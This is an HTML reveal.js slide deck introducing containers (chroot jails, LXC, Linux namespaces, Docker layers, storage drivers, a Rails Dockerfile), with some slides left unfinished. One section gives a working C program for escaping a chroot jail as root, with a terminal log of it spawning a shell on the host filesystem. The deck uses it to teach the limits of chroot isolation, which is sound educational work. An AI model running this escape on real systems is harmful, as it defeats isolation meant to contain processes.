<!doctype html>
<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

		<title>Let's Encrypt Rails</title>

		<link rel="stylesheet" href="css/reveal.css">
		<link rel="stylesheet" href="css/theme/black.css">

		<!-- Theme used for syntax highlighting of code -->
		<link rel="stylesheet" href="lib/css/zenburn.css">

		<!-- Printing and PDF exports -->
		<script>
			var link = document.createElement( 'link' );
			link.rel = 'stylesheet';
			link.type = 'text/css';
			link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
			document.getElementsByTagName( 'head' )[0].appendChild( link );
		</script>
	</head>
	<body>
		<div class="reveal">
			<div class="slides">
				<section>
          <h1>Let's Encrypt Rails</h1>
          <p>me@yongwen.xyz</p>
        </section>

        <section>
          <h2>Containers vs Baremetal</h2>
          <img src="images/lxc-vs-baremetal.png" />
        </section>

        <section data-markdown>
          <script type="text/template">
            ## Containers
               - LXC (_lex-cee_)
               - Docker
            </script>
        </section>

        <section>
          <section>
            <h2>chroot</h2>
          </section>
           <section data-markdown>
              <script type="text/template">
                ## `chroot` Jail — Preparation

                ```bash
                ~$ J=$HOME/jail
                ~$ mkdir -p $J
                ~$ mkdir -p $J/{bin,lib64,lib}
                ~$ cd $J
                ~/jail$ cp -v /bin/{bash,ls} $J/bin
                '/bin/bash' -> '/home/yongwen/jail/bin/bash'
                '/bin/ls' -> '/home/yongwen/jail/bin/ls'
                ~/jail$ ldd /bin/bash
                  linux-vdso.so.1 =>  (0x00007fffc8122000)
                  libtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5 (0x00007f332ad75000)
                  libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f332ab71000)
                  libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f332a7a7000)
                  /lib64/ld-linux-x86-64.so.2 (0x0000562479ccd000)
                ~/jail$ mkdir -p lib/x86_64-linux-gnu
                ~/jail$ cp /lib/x86_64-linux-gnu/libtinfo.so.5 /lib/x86_64-linux-gnu/libdl.so.2 /lib/x86_64-linux-gnu/libc.so.6 lib/x86_64-linux-gnu
                ~/jail$ mkdir lib64
                ~/jail$ cp /lib64/ld-linux-x86-64.so.2 lib
                lib/   lib64/
                ~/jail$ cp /lib64/ld-linux-x86-64.so.2 lib
                lib/   lib64/
                ~/jail$ cp /lib64/ld-linux-x86-64.so.2 lib
                lib/   lib64/
                ~/jail$ cp /lib64/ld-linux-x86-64.so.2 lib64/
                ~/jail$ list="$(ldd /bin/ls | egrep -o '/lib.*\.[0-9]')"
                ~/jail$ for i in $list; do cp  -v "$i" "${J}${i}"; done
                '/lib/x86_64-linux-gnu/libselinux.so.1' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libselinux.so.1'
                '/lib/x86_64-linux-gnu/libc.so.6' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libc.so.6'
                '/lib/x86_64-linux-gnu/libpcre.so.3' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libpcre.so.3'
                '/lib/x86_64-linux-gnu/libdl.so.2' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libdl.so.2'
                '/lib64/ld-linux-x86-64.so.2' -> '/home/yongwen/jail/lib64/ld-linux-x86-64.so.2'
                '/lib/x86_64-linux-gnu/libpthread.so.0' -> '/home/yongwen/jail/lib/x86_64-linux-gnu/libpthread.so.0'
                ```

                <aside class="notes">
                  <ul>
                    <li>chroot jail changes the apparent root directory and its children</li>
                    <li>Lightweight virtualization</li>
                    <li>Not very user friendly</li>
                  </ul>
                </aside>
              </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ## chroot — Finally
               ```bash
               ~/jail$ sudo chroot $J /bin/bash
               bash-4.3# pwd
               /
               bash-4.3# ls -al
               total 20
               drwxrwxr-x 5 1000 1000 4096 Sep 13 02:46 .
               drwxrwxr-x 5 1000 1000 4096 Sep 13 02:46 ..
               drwxrwxr-x 2 1000 1000 4096 Sep 13 02:47 bin
               drwxrwxr-x 3 1000 1000 4096 Sep 13 02:48 lib
               drwxrwxr-x 2 1000 1000 4096 Sep 13 02:49 lib64
               bash-4.3# echo $$
               24475
               ```
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ## chroot Jailbreak  [[src]](https://filippo.io/escaping-a-chroot-jail-slash-1/)
               ```c
               #include <sys/stat.h>
               #include <unistd.h>
               #include <fcntl.h>

               int main() {
                   int dir_fd, x;
                   setuid(0); // set to root user
                   mkdir(".42", 0755); // create a temp directory
                   // get descriptor to current fake root
                   dir_fd = open(".", O_RDONLY);
                   chroot(".42"); // chroot to temp directory
                   fchdir(dir_fd); // cd to previous fake root
                   close(dir_fd);
                   for(x = 0; x < 1000; x++) chdir(".."); // go up up up
                   chroot(".");
                   return execl("/bin/sh", "-i", NULL); // profit?
               }
               ```

               <aside class="notes">
                <p>Can be done by anyone with the `CAP_SYS_CHROOT` privilege (i.e. root has it)</p>
                <p>`chroot` all the way up to root.</p>
                <p>Spawn a shell from root.</p>
                <p>Profit???</p>
               </aside>
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ## chroot Jailbreak

               ```bash
               ~/jail$ ls -al
               total 1812
               drwxrwxr-x  6 yongwen yongwen   4096 Sep 13 12:34 .
               drwxr-xr-x 96 yongwen yongwen   4096 Sep 13 12:34 ..
               drwxr-xr-x  2 root    root      4096 Sep 13 12:33 .42
               drwxrwxr-x  2 yongwen yongwen   4096 Sep 13 10:47 bin
               drwxrwxr-x  3 yongwen yongwen   4096 Sep 13 10:48 lib
               drwxrwxr-x  2 yongwen yongwen   4096 Sep 13 10:49 lib64
               -rwxrwxr-x  1 yongwen yongwen 909168 Sep 13 12:32 unchroot
               -rwxrwxr-x  1 yongwen yongwen 909376 Sep 13 12:34 unchroot2
               -rw-rw-r--  1 yongwen yongwen    332 Sep 13 12:34 unchroot2.c
               -rw-rw-r--  1 yongwen yongwen    205 Sep 13 12:32 unchroot.c
               ~/jail$ sudo chroot .
               bash-4.3# ls -al
               total 1812
               drwxrwxr-x 6 1000 1000   4096 Sep 13 04:34 .
               drwxrwxr-x 6 1000 1000   4096 Sep 13 04:34 ..
               drwxr-xr-x 2    0    0   4096 Sep 13 04:33 .42
               drwxrwxr-x 2 1000 1000   4096 Sep 13 02:47 bin
               drwxrwxr-x 3 1000 1000   4096 Sep 13 02:48 lib
               drwxrwxr-x 2 1000 1000   4096 Sep 13 02:49 lib64
               -rwxrwxr-x 1 1000 1000 909168 Sep 13 04:32 unchroot
               -rw-rw-r-- 1 1000 1000    205 Sep 13 04:32 unchroot.c
               -rwxrwxr-x 1 1000 1000 909376 Sep 13 04:34 unchroot2
               -rw-rw-r-- 1 1000 1000    332 Sep 13 04:34 unchroot2.c
               bash-4.3# ./unchroot2
               -i: 26: [[: not found
               # ls -al
               total 295
               drwxr-xr-x  26 root root   4096 Aug 30 09:15 .
               drwxr-xr-x  26 root root   4096 Aug 30 09:15 ..
               drwxr-xr-x   2 root root   4096 Aug  8 09:17 bin
               drwxr-xr-x   5 root root   3072 Aug 30 09:15 boot
               drwxrwxr-x   2 root root   4096 Oct 28  2015 cdrom
               -rw-------   1 root root      0 Nov  6  2015 core
               drwxr-xr-x  22 root root   4600 Sep  5 11:18 dev
               drwxr-xr-x 166 root root  12288 Sep 13 10:40 etc
               drwxr-xr-x   4 root root   4096 Jun 20 12:47 home
               lrwxrwxrwx   1 root root     32 Aug 30 09:09 initrd.img -> boot/initrd.img-4.4.0-36-generic
               drwxr-xr-x  25 root root   4096 Sep 13 10:40 lib
               drwxr-xr-x   2 root root   4096 May 16 13:50 lib32
               drwxr-xr-x   2 root root   4096 May 16 13:42 lib64
               drwxr-xr-x   2 root root   4096 May 16 13:42 libx32
               drwx------   2 root root  16384 Oct 28  2015 lost+found
               drwxr-xr-x   3 root root   4096 Oct 28  2015 media
               drwxr-xr-x   2 root root   4096 May 16 13:42 mnt
               drwxr-xr-x   8 root root   4096 May 31 16:04 opt
               dr-xr-xr-x 350 root root      0 Sep  5 11:18 proc
               drwx------  13 root root   4096 Jul 11 11:37 root
               drwxr-xr-x  37 root root   1180 Sep 13 10:40 run
               drwxr-xr-x   2 root root  12288 Sep 13 10:40 sbin
               drwxr-xr-x   2 root root   4096 May 10 05:32 snap
               drwxr-xr-x   2 root root   4096 Oct 21  2015 srv
               dr-xr-xr-x  13 root root      0 Sep 13 12:35 sys
               drwxrwxrwt  20 root root 184320 Sep 13 12:55 tmp
               drwxr-xr-x  13 root root   4096 Dec 10  2015 usr
               drwxr-xr-x  15 root root   4096 May 16 13:51 var
               lrwxrwxrwx   1 root root     29 Aug 30 09:09 vmlinuz -> boot/vmlinuz-4.4.0-36-generic
               ```
             </script>
           </section>
        </section>

       <section data-markdown>
         <script type="text/template">
           ## LXC [[1]](http://www.stgraber.org/2013/12/20/lxc-1-0-blog-post-series/)
           - A virtual machine without an emulated hardware layer and another OS layer
           - Makes use of Linux Kernel Features
              - Namespaces
              - Control Groups (cgroups)
              - chroot
              - AppArmor
              - SELinux
           <aside class="notes">
             <p>
               LXC (probably originally an acronym for Linux Containers) orchestrates several features of the
               Linux to allow users to set up unprivileged containers to isolate processes and applications, in
               both userland and kernel space. LXC takes care of networking and storage too.
             </p>
             <p>
               Pretty terrible documentation. Developed mainly on Ubuntu -- so most things will be documented
               for Ubuntu, that may or may not work on other distributions.
             </p>
           </aside>
          </script>
       </section>

       <section>
           <section data-markdown>
             <script type="text/template">
               ## Namespace [[1]](http://www.haifux.org/lectures/299/netLec7.pdf) [[2]](https://media.wix.com/ugd/295986_d5059f95a78e451db5de3d54f711e45d.pdf) [[3]](https://lwn.net/Articles/531114/)

               - Lightweight process virtualisation
               - Six Namespaces:
                - uts (hostname)
                - ipc (Interprocess communication)
                - pid (processes)
                - mnt (mount points, filesystems)
                - net (network stack)
                - user (UIDs)
               - `clone` -- create a new process and namespace and attach process to new namespace
               - `unshare` -- create a new namespace and attach current process
               - `setns` -- join Namespace
              </script>
          </section>

           <section data-markdown>
             <script type="text/template">
               ## Namespace
               ```bash
               $ ls -al "/proc/$$/ns"
               total 0
               dr-x--x--x 2 yongwen yongwen 0 Sep 13 13:28 .
               dr-xr-xr-x 9 yongwen yongwen 0 Sep 13 10:46 ..
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 cgroup -> cgroup:[4026531835]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 ipc -> ipc:[4026531839]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 mnt -> mnt:[4026531840]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 net -> net:[4026531969]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 pid -> pid:[4026531836]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 user -> user:[4026531837]
               lrwxrwxrwx 1 yongwen yongwen 0 Sep 13 13:28 uts -> uts:[4026531838]
               ```
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
              ### UTS (Unix Timesharing) [[1]](https://blog.yadutaf.fr/2013/12/22/introduction-to-linux-namespaces-part-1-uts/) [[2]](http://windsock.io/uts-namespace/)

              - Separate copy of hostname
              - ... and outdated [Network Information Service](http://docs.oracle.com/cd/E19455-01/806-1387/6jam692ca/index.html)
              <aside class="notes">
                <p>UTS is just an ancient term for multitasking on a Unix system</p>
                <p>In this context, is just that the processes have a separate copy of the hostname</p>
              </aside>
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ### IPC (Interprocess Communication) [[1]](https://blog.yadutaf.fr/2013/12/28/introduction-to-linux-namespaces-part-2-ipc/) [[2]](http://windsock.io/ipc-namespace/)

               - `ipcs -a`
               - Isolates the various IPC mechanisms
                 - Pipes
                 - Shared Memory
                 - Message Queues
                 - Semaphores

                <aside class="notes">
                  <p>Separate set of IPC mechanism. No name collision</p>
                </aside>
             </script>

           </section>

           <section data-markdown>
             <script type="text/template">
               ### PID (Process ID) [[1]](https://blog.yadutaf.fr/2014/01/05/introduction-to-linux-namespaces-part-3-pid/) [[2]](http://windsock.io/pid-namespace/)

               - Restarts numbering of PID for child processes to 1
               - Only self (1) + descendants are visible
               - PID 1 is like the `init` process (like [`systemd`](https://en.wikipedia.org/wiki/Systemd))

               <aside class="notes">
                 Interesting <a href="http://unix.stackexchange.com/a/287282/189657">systemd</a>
               </aside>
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ### mnt (mount points, filesystems) [[1]](https://blog.yadutaf.fr/2014/01/12/introduction-to-linux-namespaces-part-4-ns-fs/) [[2]](http://windsock.io/mnt-namespace/)

               - Created by copying mountpoints from spawning namespace
               - Isolated set of mount points
               - Any mount/unmounting will only affect the child
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
               ### net (Network Stack) [[1]](https://blog.yadutaf.fr/2014/01/19/introduction-to-linux-namespaces-part-5-net/) [[2]](http://windsock.io/net-namespace/)

               - Private network stack -- routews, firewall rules, network devices, ports
               - Communicate with the outside world via `veth`, for example

               <aside class="notes">
                 <p>A network device and socket belongs to exactly one network namespace</p>
                 <p>A new namespace only has the loopback device</p>
                 <p> Creating a pair of network devices (veth) and move one to another network namespace. -- Veth (Virtual Ethernet) is like a pipe. </p>

               </aside>
             </script>
           </section>

           <section data-markdown>
             <script type="text/template">
              ### User (UIDs, PIDs) [[1]](https://lwn.net/Articles/532593/)

              - Separate set of UIDs and GIDs in processes
              - Needs to map inner UID/GID with parent UID/GID

              <aside class="notes">
                <p>By default mapped to overflow user -- with no rights or capabilities</p>
              </aisde>
             </script>
           </section>
        </section>

        <section>
          <section data-markdown>
            <script type="text/template">
              ## Control Groups (cgroups) [[1]](https://lwn.net/Articles/604609/)

            </script>
          </section>
        </section>

        <section>
          <section data-markdown>
            <script type="text/template">
              ## Docker

              - Run *applications* in an isolated manner in containers
              - Designed to run a _single process_
              - No storage persistence by default

              <aside class="notes">
                <p>Docker is a technology not too dis-similar from LXC. It is designed to run a single process
                in an isolated manner in terms of storage, processes, IPC, network etc.</p>

                <p>Since it is designed to run a single process, many applications don't work well with it out of the
                box and LXC is an easiler replacement.</p>
              </aside>
            </script>
          </section>

          <section>
            <h3>LXC vs Docker</h3>
            <img src="images/lxc-vs-docker.png" />
          </section>


          <section data-markdown>
            <script type="text/template">
              ### Docker's relationship with LXC [[1]](http://jancorg.github.io/blog/2015/01/03/libcontainer-overview/)

              ![Diagram](images/docker-lxc-relationship.png)

              <aside class="notes">
                <p>Docker used to use LXC as one of its execution driver</p>
                <p>Now it uses libcontainer directly as a form of abstraction</p>
                <p>Libcontainer can use LXC as an execution driver</p>
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Docker Layers

              ![Layers](images/docker-layers.jpg)

              <aside class="notes">
                <p>Docker images layers are R/O and are shared</p>
                <p>Containers run inside a thin R/W layer that is discarded along with the container</p>
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Copy on Write

              - Only copy when shared data requires modification

              ![Layers](images/changed-ubuntu.jpg)
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Storage Drivers

              ![Drivers](images/docker-storage-drivers.png)

              <aside class="notes">
                When choosing a storage driver, you would have to consider the filesystem you are using and your use
                case. Some drivers are disabled on certain file systems. By default, a Docker installation will choose
                a driver that is most stable for your system.
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### AUFS [[1]](https://docs.docker.com/engine/userguide/storagedriver/aufs-driver/)

              - Original Docker Storage Driver
              - Unification filesystem

              ![AUFS](images/aufs-layers.jpg)

              <aside class="notes">
                <p>AUFS the first storage driver for Docker, and the Docker image layering system was developed
                in tandem with AUFS. </p>

                <p>The issue with AUFS is that it is not part of the mainline kernel, and when other Linux distributions
                  such as RedHat wanted to implement Docker, Docker implemented the storage driver system to allow
                  other drivers.</p>

                <p>Not unlike the Image layer system, AUFS is a unification filesystem by stacking multiple directories
                  on a Linux host as layers to provide a single unified view</p>

                <p>The stacked unified view is viewed through a mount point known as the union mount point. Each
                layer is called a branch.</p>

              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### AUFS Copy On Write

              #![COW](images/aufs-files.jpg)

              <aside class="notes">
                <p>When a file needs to be modified, AUFS copies the entire file and then saves the modified file
                  in an upper branch</p>
                <p>This can cause an impact if the files modified are large, or the branches or directories are deep.</p>
                <p>When deleting a file, AUFS writes a "whiteout" file to indicate the deletion of the file.</p>
              </aside>
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Docker Complexities

              - [Zombie reaping issue](https://blog.phusion.nl/2015/01/20/docker-and-the-pid-1-zombie-reaping-problem/)
              - Multiple containers to run simple application
              - Rails
              - Database
              - Resque
              - etc.
              - See [`baseimage-docker`](https://github.com/phusion/baseimage-docker)
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Docker Complexities

              ```bash
              $ docker run --help

              Usage:	docker run [OPTIONS] IMAGE [COMMAND] [ARG...]

              Run a command in a new container

              Options:
              --add-host value              Add a custom host-to-IP mapping (host:ip) (default [])
              -a, --attach value                Attach to STDIN, STDOUT or STDERR (default [])
              --blkio-weight value          Block IO (relative weight), between 10 and 1000
              --blkio-weight-device value   Block IO weight (relative device weight) (default [])
              --cap-add value               Add Linux capabilities (default [])
              --cap-drop value              Drop Linux capabilities (default [])
              --cgroup-parent string        Optional parent cgroup for the container
              --cidfile string              Write the container ID to the file
              --cpu-percent int             CPU percent (Windows only)
              --cpu-period int              Limit CPU CFS (Completely Fair Scheduler) period
              --cpu-quota int               Limit CPU CFS (Completely Fair Scheduler) quota
              -c, --cpu-shares int              CPU shares (relative weight)
              --cpuset-cpus string          CPUs in which to allow execution (0-3, 0,1)
              --cpuset-mems string          MEMs in which to allow execution (0-3, 0,1)
              -d, --detach                      Run container in background and print container ID
              --detach-keys string          Override the key sequence for detaching a container
              --device value                Add a host device to the container (default [])
              --device-read-bps value       Limit read rate (bytes per second) from a device (default [])
              --device-read-iops value      Limit read rate (IO per second) from a device (default [])
              --device-write-bps value      Limit write rate (bytes per second) to a device (default [])
              --device-write-iops value     Limit write rate (IO per second) to a device (default [])
              --disable-content-trust       Skip image verification (default true)
              --dns value                   Set custom DNS servers (default [])
              --dns-opt value               Set DNS options (default [])
              --dns-search value            Set custom DNS search domains (default [])
              --entrypoint string           Overwrite the default ENTRYPOINT of the image
              -e, --env value                   Set environment variables (default [])
              --env-file value              Read in a file of environment variables (default [])
              --expose value                Expose a port or a range of ports (default [])
              --group-add value             Add additional groups to join (default [])
              --health-cmd string           Command to run to check health
              --health-interval duration    Time between running the check
              --health-retries int          Consecutive failures needed to report unhealthy
              --health-timeout duration     Maximum time to allow one check to run
              --help                        Print usage
              -h, --hostname string             Container host name
              -i, --interactive                 Keep STDIN open even if not attached
              --io-maxbandwidth string      Maximum IO bandwidth limit for the system drive (Windows only)
              --io-maxiops uint             Maximum IOps limit for the system drive (Windows only)
              --ip string                   Container IPv4 address (e.g. 172.30.100.104)
              --ip6 string                  Container IPv6 address (e.g. 2001:db8::33)
              --ipc string                  IPC namespace to use
              --isolation string            Container isolation technology
              --kernel-memory string        Kernel memory limit
              -l, --label value                 Set meta data on a container (default [])
              --label-file value            Read in a line delimited file of labels (default [])
              --link value                  Add link to another container (default [])
              --link-local-ip value         Container IPv4/IPv6 link-local addresses (default [])
              --log-driver string           Logging driver for the container
              --log-opt value               Log driver options (default [])
              --mac-address string          Container MAC address (e.g. 92:d0:c6:0a:29:33)
              -m, --memory string               Memory limit
              --memory-reservation string   Memory soft limit
              --memory-swap string          Swap limit equal to memory plus swap: '-1' to enable unlimited swap
              --memory-swappiness int       Tune container memory swappiness (0 to 100) (default -1)
              --name string                 Assign a name to the container
              --network string              Connect a container to a network (default "default")
              --network-alias value         Add network-scoped alias for the container (default [])
              --no-healthcheck              Disable any container-specified HEALTHCHECK
              --oom-kill-disable            Disable OOM Killer
              --oom-score-adj int           Tune host's OOM preferences (-1000 to 1000)
              --pid string                  PID namespace to use
              --pids-limit int              Tune container pids limit (set -1 for unlimited)
              --privileged                  Give extended privileges to this container
              -p, --publish value               Publish a container's port(s) to the host (default [])
              -P, --publish-all                 Publish all exposed ports to random ports
              --read-only                   Mount the container's root filesystem as read only
              --restart string              Restart policy to apply when a container exits (default "no")
              --rm                          Automatically remove the container when it exits
              --runtime string              Runtime to use for this container
              --security-opt value          Security Options (default [])
              --shm-size string             Size of /dev/shm, default value is 64MB
              --sig-proxy                   Proxy received signals to the process (default true)
              --stop-signal string          Signal to stop a container, SIGTERM by default (default "SIGTERM")
              --storage-opt value           Storage driver options for the container (default [])
              --sysctl value                Sysctl options (default map[])
              --tmpfs value                 Mount a tmpfs directory (default [])
              -t, --tty                         Allocate a pseudo-TTY
              --ulimit value                Ulimit options (default [])
              -u, --user string                 Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])
              --userns string               User namespace to use
              --uts string                  UTS namespace to use
              -v, --volume value                Bind mount a volume (default [])
              --volume-driver string        Optional volume driver for the container
              --volumes-from value          Mount volumes from the specified container(s) (default [])
              -w, --workdir string              Working directory inside the container
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Example Rails Application

              ```bash
              mkdir example
              cd example
              rails new . --database=postgresql
              # Postgres Host: postgres
              # Database: example_development
              # User: example
              # Passsword: example
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Dockerfile

              ```dockerfile
              FROM ruby:2.3.1

              WORKDIR /app/src

              COPY Gemfile Gemfile.lock /app/src/
              RUN bundle install

              COPY . /usr/src/app
              CMD rails s
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### Running Docker Containers

              ```bash
              # Postgres Container
              docker run
              ```
            </script>
          </section>

          <section data-markdown>
            <script type="text/template">
              ### docker-compose

              - Orchestrates multiple containers and their parameters in a single `.yml` file
            </script>
          </section>
        </section>
			</div>
		</div>

		<script src="lib/js/head.min.js"></script>
		<script src="js/reveal.js"></script>

		<script>
			// More info https://github.com/hakimel/reveal.js#configuration
			Reveal.initialize({
				history: true,

				// More info https://github.com/hakimel/reveal.js#dependencies
				dependencies: [
					{ src: 'plugin/markdown/marked.js' },
					{ src: 'plugin/markdown/markdown.js' },
					{ src: 'plugin/notes/notes.js', async: true },
					{ src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
				]
			});
		</script>
	</body>
</html>
